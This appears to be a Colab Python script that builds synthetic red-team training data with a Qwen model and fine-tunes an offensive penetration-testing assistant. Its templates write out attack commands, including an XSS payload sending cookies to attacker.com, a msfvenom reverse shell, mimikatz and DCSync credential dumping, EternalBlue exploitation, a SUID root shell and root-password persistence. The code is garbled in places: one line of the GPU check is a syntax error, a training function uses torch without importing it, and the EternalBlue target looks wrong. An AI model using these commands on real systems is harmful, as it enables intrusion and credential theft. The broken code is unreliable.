#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CyberSec 4B Model - Colab Complete Version
==========================================
對應原版 Cybersecurity-4B-AI-Model 完整架構

使用方法 (Google Colab):
```python
!git clone https://github.com/Look0316/LLM_colab.git
%cd LLM_colab
!python colab_complete.py
```
"""

import os
import sys
import json
import time
import logging
from datetime import datetime
from typing import List, Dict

# UTF-8 編碼
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')

logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger(__name__)

def safe_print(msg):
    try: print(msg)
    except: pass

# ═══════════════════════════════════════════════════════════════════════════
# 配置
# ═══════════════════════════════════════════════════════════════════════════

CONFIG = {
    # 模型配置
    "deepseek_model": "deepseek-ai/deepseek-coder-7b-instruct-v1.5",
    "qwen_model": "Qwen/Qwen2.5-7B-Instruct",
    "base_model": "Qwen/Qwen2.5-7B-Instruct",
    
    # 數據配置
    "max_samples": 2000,
    "data_path": "/content/data/distilled_tinyllm.jsonl",
    "output_dir": "/content/outputs/finetuned_tinyllm_v1",
    
    # 訓練配置
    "num_train_epochs": 3,
    "per_device_train_batch_size": 2,
    "gradient_accumulation_steps": 4,
    "learning_rate": 2e-4,
    "max_seq_length": 1024,
    
    # QLoRA 配置
    "lora_r": 16,
    "lora_alpha": 32,
    "lora_dropout": 0.05,
    "lora_target_modules": ["q_proj", "k_proj", "v_proj", "o_proj"],
    
    # Colab 優化
    "use_drive": False,
}

# ═══════════════════════════════════════════════════════════════════════════
# 工具函數
# ═══════════════════════════════════════════════════════════════════════════

def check_gpu():
    """檢查 GPU"""
    import torch
    if torch.cuda.is_available():
        gpu_name = torch.cuda.get_device_name(0)
        gpu_mem = torch.cuda.get_device_properties(0).total_memory / (1024**3)
        safe_print(f"\n✅ GPU: {gpu_name} ({gpu_mem:.1f} GB)")
        
        # 自動調整 batch size
        if gpu_mem >= 14:
            CONFIG["per_device_train_batch_size"] = 4
        elif gpu_mem >= 10:
            CONFIG["per_device_train_batch_size"] = 2
        elseper_device_train_batch:
            CONFIG["_size"] = 1
        
        return True
    else:
        safe_print("\n⚠️ 未檢測到 GPU!")
        return False

def clean_gpu_memory():
    """清理 GPU 記憶體"""
    import torch
    import gc
    gc.collect()
    torch.cuda.empty_cache()

def print_step(step_num, title):
    """打印步驟"""
    safe_print(f"\n{'='*60}")
    safe_print(f"  STEP {step_num}: {title}")
    safe_print(f"{'='*60}")

# ═══════════════════════════════════════════════════════════════════════════
# 安裝依賴
# ═══════════════════════════════════════════════════════════════════════════

def install_dependencies():
    """安裝必要的依賴"""
    print_step(0, "安裝依賴")
    
    import subprocess
    import sys
    
    packages = [
        "transformers>=4.40.0",
        "torch>=2.1.0",
        "accelerate>=0.28.0",
        "peft>=0.10.0",
        "bitsandbytes>=0.41.0",
        "trl>=0.8.0",
        "scikit-learn",
        "tqdm",
        "datasets",
    ]
    
    for pkg in packages:
        subprocess.check_call([
            sys.executable, "-m", "pip", "install", "-q", pkg
        ])
    
    safe_print("✅ 依賴安裝完成")

# ═══════════════════════════════════════════════════════════════════════════
# PART 1: Multi-Teacher Distillation (數據生成)
# ═══════════════════════════════════════════════════════════════════════════

# 場景模板 (完全對應原版)
SCENARIO_TEMPLATES = [
    "You're performing reconnaissance. You notice open ports {ports} on {target}.",
    "During a penetration test, you discover a {service} service running on port {port}.",
    "Initial access achieved via {method}. You've found {finding}.",
    "You're analyzing a web application. You notice {vulnerability_type} in the {component}.",
    "SQL injection confirmed on {parameter}.",
    "XSS found on {page}. The payload {payload} was reflected.",
    "Buffer overflow detected in {binary}. The crash occurs at offset {offset}.",
    "Weak password policy discovered. Current password hash is {hash_type}.",
    "You've compromised {host} as {user}. The next target is {target}.",
    "Found {cred_type} credentials: {creds}.",
    "Lateral movement to {target} successful. Now you have {privilege}.",
    "Current shell is {user}@{host}. You found {vuln} vulnerability.",
    "SUID binary {binary} found. It calls {function}.",
    "Kernel version {version} on {os}. Known exploit is {exploit}.",
]

# 正確答案模板 (完全對應原版)
ANSWER_TEMPLATES = {
    "ports": [
        "Run nmap -sV -sC {target} to enumerate services.",
        "Use enum4linux for SMB enumeration."
    ],
    "service": [
        "Check for known CVEs: searchsploit {service} {version}.",
        "Attempt default credential login."
    ],
    "method": [
        "Maintain persistence: add SSH key, create cron job.",
        "Escalate privilege using the found {finding}."
    ],
    "vulnerability_type": [
        "For SQLi, use sqlmap; for XSS, escalate to session hijacking."
    ],
    "SQL injection": [
        "Use sqlmap -u 'URL' --dbs to enumerate databases.",
        "Attempt UNION-based injection."
    ],
    "XSS": [
        "Escalate to account takeover via cookie theft.",
        "Use beef hook for persistent access."
    ],
    "Buffer overflow": [
        "Generate payload: msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f python.",
        "Find exact offset with pattern_create."
    ],
    "Hash dumping": [
        "Use mimikatz: sekurlsa::logonpasswords full",
        "Access SAM file: reg save HKLM\\SYSTEM SystemSave"
    ],
    "compromised": [
        "Perform privilege escalation: check sudo -l, kernel exploits.",
        "Use the access to pivot: scan internal network."
    ],
    "credentials": [
        "Use crackmapexec to test credentials across the network.",
        "Escalate: use psexec, wmiexec for lateral movement."
    ],
    "Lateral movement": [
        "Dump LSASS for more credentials, then pivot to domain controller.",
        "Use DCSync to dump domain hashes."
    ],
    "privilege escalation": [
        "Check GTFOBins for SUID binary exploitation.",
        "Use kernel exploit: compile and run CVE-2021-43298."
    ],
    "kernel": [
        "Download and compile kernel exploit, then execute for root shell."
    ],
}

# In-context Examples 庫 (完全對應原版)
INCONTEXT_EXAMPLES = [
    {
        "scenario": "XSS found on login page. The payload <script>alert(1)</script> was reflected.",
        "answer": "Escalate to account takeover via session cookie theft",
        "rationale": """## State: Reflected XSS on login page with user-controllable input

## Hypothesis: Can escalate to account takeover via cookie theft

## Experiment: Submit cookie-stealing payload
```bash
<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

## Observation: Attacker server receives request with session cookie

## Success: Yes - Session ID captured

## Next: Use cookie to authenticate as victim user
```bash
# Use the stolen cookie
curl -b "session=stolen_cookie" http://target.com/admin
```"""
    },
    {
        "scenario": "SQL injection confirmed on user_id parameter in login form.",
        "answer": "Dump database and escalate to RCE",
        "rationale": """## State: SQL injection on login form (authenticated as guest)

## Hypothesis: Can enumerate databases and extract sensitive data

## Experiment: Enumerate databases with sqlmap
```bash
sqlmap -u 'http://target.com/login?user_id=1' --dbs
```

## Observation: Identified 5 databases including 'users'

## Success: Yes - Found admin table with password hashes

## Next: Crack hashes and use for lateral movement
```bash
# Dump the users table
sqlmap -u 'http://target.com/login?user_id=1' -D users --tables -T admin --dump
```"""
    },
    {
        "scenario": "Found SSH private key for user www-data on compromised server.",
        "answer": "Use key for lateral movement to other servers",
        "rationale": """## State: Have SSH private key for www-data user

## Hypothesis: Can use key to access other servers where this user exists

## Experiment: SSH to other discovered servers
```bash
chmod 600 id_rsa
ssh -i id_rsa www-data@10.10.10.15
```

## Observation: Successfully authenticated to target server

## Success: Yes - Got shell as www-data on 10.10.10.15

## Next: Privilege escalation to root
```bash
# Check for privilege escalation vectors
sudo -l
find / -perm -4000 2>/dev/null
```"""
    },
    {
        "scenario": "SMBv1 enabled on Windows Server 2019 (10.10.10.5).",
        "answer": "Exploit EternalBlue for initial access",
        "rationale": """## State: SMBv1 enabled on Windows Server 2019

## Hypothesis: MS17-010 vulnerability may be present

## Experiment: Scan for EternalBlue
```bash
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.5
```

## Observation: VULNERABLE - MS17-010 confirmed

## Success: Yes - Target is vulnerable to EternalBlue

## Next: Exploit for reverse shell
```bash
# Use Metasploit or manual exploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.5
set LHOST 10.10.10.10
run
```"""
    },
    {
        "scenario": "Current shell is www-data@10.10.10.5. You found SUID binary /usr/bin/python3 running as root.",
        "answer": "Exploit SUID binary for root shell",
        "rationale": """## State: Limited shell as www-data, found SUID python3

## Hypothesis: Can escalate to root using python3 SUID

## Experiment: Spawn root shell
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Observation: Root shell obtained!

## Success: Yes - Full root access on 10.10.10.5

## Next: Dump credentials and persist
```bash
# Dump password hashes
cat /etc/shadow
# Add persistence
echo "root:password123" | chpasswd
```"""
    },
]

def generate_distilled_data(output_file: str, num_samples: int = 2000) -> str:
    """
    數據生成函數 - 對應原版 multi_teacher_distillation.py
    """
    print_step(1, "生成 TinyLLM 格式數據")
    
    import torch
    from transformers import AutoModelForCausalLM, AutoTokenizer
    import random
    from tqdm import tqdm
    import json
    
    safe_print(f"   模型: {CONFIG['qwen_model']}")
    safe_print(f"   樣本數: {num_samples}")
    
    # 創建輸出目錄
    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    
    # 載入模型
    safe_print("\n🔄 載入模型...")
    tokenizer = AutoTokenizer.from_pretrained(
        CONFIG['qwen_model'], 
        trust_remote_code=True
    )
    model = AutoModelForCausalLM.from_pretrained(
        CONFIG['qwen_model'],
        torch_dtype=torch.float16,
        device_map="auto",
        trust_remote_code=True,
    )
    safe_print("✅ 模型載入完成")
    
    # 生成數據
    data = []
    
    safe_print("\n🔄 生成數據中...")
    for i in tqdm(range(num_samples), desc="生成"):
        # 隨機選擇場景和答案
        scenario = random.choice(SCENARIO_TEMPLATES)
        category = random.choice(list(ANSWER_TEMPLATES.keys()))
        answers = ANSWER_TEMPLATES[category]
        answer = random.choice(answers)
        
        # 5 個 in-context examples
        examples = random.sample(INCONTEXT_EXAMPLES, min(5, len(INCONTEXT_EXAMPLES)))
        
        # 構造對話 (完全對應原版格式)
        messages = [
            {"role": "system", "content": "You are a professional penetration tester with expertise in Red Team operations."},
            {"role": "user", "content": f"## Scenario: {scenario}\n\n## Instruction: Think step-by-step about the attack chain, including:\n1. State: Current situation\n2. Hypothesis: What is possible\n3. Experiment: What command would you run?\n4. Observation: What would you see?\n5. Success: Yes/No\n6. Next: What would you try next?\n\nProvide the complete attack chain with executable commands."},
        ]
        
        # 生成回應
        text = tokenizer.apply_chat_template(
            messages,
            tokenize=False,
            add_generation_prompt=True,
        )
        
        inputs = tokenizer(text, return_tensors="pt").to(model.device)
        
        with torch.no_grad():
            outputs = model.generate(
                **inputs,
                max_new_tokens=512,
                temperature=0.7,
                top_p=0.9,
                do_sample=True,
            )
        
        response = tokenizer.decode(outputs[0], skip_special_tokens=True)
        
        # TinyLLM 格式 (完全對應原版)
        sample = {
            "messages": messages + [{"role": "assistant", "content": response}],
            "category": category,
            "scenario": scenario,
            "answer": answer,
            "in_context_examples": examples,
        }
        
        data.append(sample)
        
        # 每 100 樣本清理記憶體
        if (i + 1) % 100 == 0:
            clean_gpu_memory()
    
    # 保存
    with open(output_file, 'w', encoding='utf-8') as f:
        for item in data:
            f.write(json.dumps(item, ensure_ascii=False) + '\n')
    
    safe_print(f"\n✅ 數據已保存: {output_file}")
    safe_print(f"   總樣本數: {len(data)}")
    
    # 卸載模型
    del model
    clean_gpu_memory()
    
    return output_file

# ═══════════════════════════════════════════════════════════════════════════
# PART 2: Train TinyLLM (訓練)
# ═══════════════════════════════════════════════════════════════════════════

def load_training_data(data_path: str) -> List[dict]:
    """載入訓練數據 - 對應原版"""
    safe_print(f"\n📖 載入 TinyLLM 格式數據: {data_path}")
    samples = []
    with open(data_path, 'r', encoding='utf-8') as f:
        for line in f:
            samples.append(json.loads(line))
    safe_print(f"   樣本數: {len(samples)}")
    return samples


def format_sample(sample: dict) -> str:
    """格式化樣本為訓練格式 - 對應原版"""
    messages = sample.get("messages", [])
    
    conversation = ""
    for msg in messages:
        role = msg.get("role", "")
        content = msg.get("content", "")
        conversation += f"<|im_start|>{role}\n{content}<|im_end|>\n"
    
    conversation += "<|im_end|>"
    return {"text": conversation}


class TinyLLMDataset:
    """數據集類 - 對應原版"""
    def __init__(self, data, tokenizer, max_length):
        self.data = data
        self.tokenizer = tokenizer
        self.max_length = max_length
    
    def __len__(self):
        return len(self.data)
    
    def __getitem__(self, idx):
        text = self.data[idx]["text"]
        encoding = self.tokenizer(
            text,
            truncation=True,
            max_length=self.max_length,
            padding="max_length",
            return_tensors="pt",
        )
        
        input_ids = encoding["input_ids"].squeeze()
        attention_mask = encoding["attention_mask"].squeeze()
        
        return {
            "input_ids": input_ids,
            "attention_mask": attention_mask,
            "labels": input_ids.clone(),
        }


def train_tinyllm(
    data_path: str,
    output_dir: str,
    num_epochs: int = 3,
) -> str:
    """
    QLoRA 訓練函數 - 對應原版 train_tinyllm.py
    """
    print_step(2, "QLoRA 訓練")
    
    from transformers import (
        AutoModelForCausalLM,
        AutoTokenizer,
        TrainingArguments,
        Trainer,
        DataCollatorForLanguageModeling
    )
    from peft import LoraConfig, get_peft_model, TaskType
    from torch.utils.data import DataLoader
    
    safe_print(f"   數據: {data_path}")
    safe_print(f"   輸出: {output_dir}")
    safe_print(f"   Epochs: {num_epochs}")
    
    # 載入數據
    samples = load_training_data(data_path)
    formatted_data = [format_sample(s) for s in samples]
    
    # 載入 tokenizer
    tokenizer = AutoTokenizer.from_pretrained(
        CONFIG['base_model'],
        trust_remote_code=True,
        padding_side="right"
    )
    if tokenizer.pad_token is None:
        tokenizer.pad_token = tokenizer.eos_token
    
    # 創建數據集
    dataset = TinyLLMDataset(
        formatted_data,
        tokenizer,
        CONFIG["max_seq_length"]
    )
    
    # 載入模型
    safe_print("\n🔄 載入基礎模型...")
    model = AutoModelForCausalLM.from_pretrained(
        CONFIG['base_model'],
        torch_dtype=torch.float16,
        device_map="auto",
        trust_remote_code=True,
    )
    
    # QLoRA 配置 (完全對應原版)
    lora_config = LoraConfig(
        task_type=TaskType.CAUSAL_LM,
        inference_mode=False,
        r=CONFIG["lora_r"],
        lora_alpha=CONFIG["lora_alpha"],
        lora_dropout=CONFIG["lora_dropout"],
        target_modules=CONFIG["lora_target_modules"],
    )
    
    model = get_peft_model(model, lora_config)
    model.print_trainable_parameters()
    
    # 訓練參數 (完全對應原版)
    training_args = TrainingArguments(
        output_dir=output_dir,
        num_train_epochs=num_epochs,
        per_device_train_batch_size=CONFIG["per_device_train_batch_size"],
        gradient_accumulation_steps=CONFIG["gradient_accumulation_steps"],
        learning_rate=CONFIG["learning_rate"],
        logging_steps=10,
        save_strategy="epoch",
        save_total_limit=2,
        fp16=True,
        report_to="none",
        dataloader_pin_memory=False,
        optim="paged_adamw_8bit",
        warmup_steps=100,
        lr_scheduler_type="cosine",
    )
    
    # Data collator
    data_collator = DataCollatorForLanguageModeling(
        tokenizer=tokenizer,
        mlm=False,
    )
    
    # Trainer
    trainer = Trainer(
        model=model,
        args=training_args,
        train_dataset=dataset,
        data_collator=data_collator,
    )
    
    # 訓練
    safe_print("\n🔥 開始訓練...")
    trainer.train()
    
    # 保存
    os.makedirs(output_dir, exist_ok=True)
    model.save_pretrained(output_dir)
    tokenizer.save_pretrained(output_dir)
    
    safe_print(f"\n✅ 模型已保存: {output_dir}")
    
    return output_dir

# ═══════════════════════════════════════════════════════════════════════════
# PART 3: Test TinyLLM (測試)
# ═══════════════════════════════════════════════════════════════════════════

def test_tinyllm(model_path: str):
    """
    測試函數 - 對應原版 test_tinyllm.py
    """
    print_step(3, "測試模型")
    
    from transformers import AutoModelForCausalLM, AutoTokenizer
    import torch
    
    # 測試場景 (完全對應原版)
    test_scenarios = [
        {
            "name": "SQL Injection",
            "scenario": "SQL injection confirmed on user_id parameter in login form"
        },
        {
            "name": "XSS Attack",
            "scenario": "XSS found on search page. The payload <script>alert(1)</script> was reflected."
        },
        {
            "name": "Buffer Overflow",
            "scenario": "Buffer overflow detected in vulnerable binary. The crash occurs at offset 256."
        },
        {
            "name": "SMB Exploit",
            "scenario": "SMBv1 enabled on Windows Server 2019 (10.10.10.5)"
        },
        {
            "name": "Credentials",
            "scenario": "Found SSH private key for user www-data on compromised server"
        },
    ]
    
    # 載入模型
    safe_print(f"\n📦 載入模型: {model_path}")
    
    if not os.path.exists(model_path):
        safe_print(f"❌ 模型不存在: {model_path}")
        return
    
    tokenizer = AutoTokenizer.from_pretrained(model_path, trust_remote_code=True)
    model = AutoModelForCausalLM.from_pretrained(
        model_path,
        torch_dtype=torch.float16,
        device_map="auto",
        trust_remote_code=True,
    )
    model.eval()
    
    safe_print("✅ 模型載入成功\n")
    
    # 測試每個場景
    for i, test in enumerate(test_scenarios, 1):
        safe_print(f"\n{'='*60}")
        safe_print(f"  Test {i}: {test['name']}")
        safe_print(f"{'='*60}")
        safe_print(f"\n👤 Scenario: {test['scenario']}")
        
        # 構造 prompt (完全對應原版)
        prompt = f"""You are a professional penetration tester.

Scenario: {test['scenario']}

Provide the complete attack chain with executable commands. Include:
- State: Current situation
- Hypothesis: What's possible
- Step-by-step commands with observations
- Final result and next steps

"""
        
        inputs = tokenizer(prompt, return_tensors="pt").to(model.device)
        
        with torch.no_grad():
            outputs = model.generate(
                **inputs,
                max_new_tokens=512,
                do_sample=True,
                temperature=0.7,
                top_p=0.9,
                pad_token_id=tokenizer.eos_token_id
            )
        
        response = tokenizer.decode(outputs[0], skip_special_tokens=True)
        
        # 提取 assistant 回應
        assistant_response = response.split("assistant")[-1].strip()
        
        safe_print(f"\n🤖 Response:\n{assistant_response[:800]}")
        
        clean_gpu_memory()
    
    safe_print(f"\n{'='*60}")
    safe_print("  ✅ 測試完成")
    safe_print(f"{'='*60}")

# ═══════════════════════════════════════════════════════════════════════════
# PART 4: Complete Pipeline (完整流程)
# ═══════════════════════════════════════════════════════════════════════════

def run_pipeline():
    """運行完整流程"""
    print("\n" + "="*60)
    safe_print("  🔐 Cybersecurity 4B Model - Colab 完整訓練流程")
    safe_print("="*60)
    
    # Step 0: 檢查 GPU
    print_step(0, "檢查 GPU")
    has_gpu = check_gpu()
    if not has_gpu:
        safe_print("⚠️ 警告: 未檢測到 GPU，訓練會非常慢!")
    
    # Step 1: 安裝依賴
    install_dependencies()
    
    # Step 2: 生成數據
    data_file = generate_distilled_data(
        CONFIG["data_path"],
        CONFIG["max_samples"]
    )
    
    # Step 3: 訓練
    output_dir = train_tinyllm(
        data_file,
        CONFIG["output_dir"],
        CONFIG["num_train_epochs"],
    )
    
    # Step 4: 測試
    test_tinyllm(output_dir)
    
    # 完成
    print("\n" + "="*60)
    safe_print("  🎉 訓練流程完成!")
    safe_print("="*60)
    safe_print(f"\n📁 模型位置: {output_dir}")
    safe_print("\n下一步:")
    safe_print("1. 下載模型文件")
    safe_print("2. 使用 transformers 載入推理")
    safe_print("3. 添加 RAG 模塊獲取最新 CVE")

# ═══════════════════════════════════════════════════════════════════════════
# 主函數
# ═══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        run_pipeline()
    except KeyboardInterrupt:
        safe_print("\n⚠️ 用戶中斷")
    except Exception as e:
        safe_print(f"\n❌ 錯誤: {e}")
        import traceback
        traceback.print_exc()
